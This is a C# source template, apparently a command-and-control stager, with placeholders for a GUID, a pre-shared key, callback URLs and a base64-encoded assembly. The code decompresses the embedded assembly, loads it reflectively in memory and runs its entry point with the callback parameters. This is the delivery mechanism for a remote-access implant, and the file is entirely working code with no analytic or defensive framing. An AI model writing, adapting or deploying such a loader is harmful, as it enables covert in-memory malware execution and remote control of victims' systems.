using System;
using System.Reflection;
using System.IO;
using System.IO.Compression;

public class CLASS_NAME
{
    public static void Main()
    {
        string guid = "GUID";
        string psk = "PSK";
        string urls = "URLS";
        string b64 = "BASE64_ENCODED_ASSEMBLY";

        string[] args = new string[] { guid, psk, urls };
        byte[] compressed = System.Convert.FromBase64String(b64);
        using (MemoryStream inputStream = new MemoryStream(compressed.Length))
        {
            inputStream.Write(compressed, 0, compressed.Length);
            inputStream.Seek(0, SeekOrigin.Begin);
            using (MemoryStream outputStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                    {
                        outputStream.Write(buffer, 0, bytesRead);
                    }
                }

              Assembly a = Assembly.Load(outputStream.ToArray());
              a.EntryPoint.Invoke(null, new object[] { args });
            }
        }
    }
}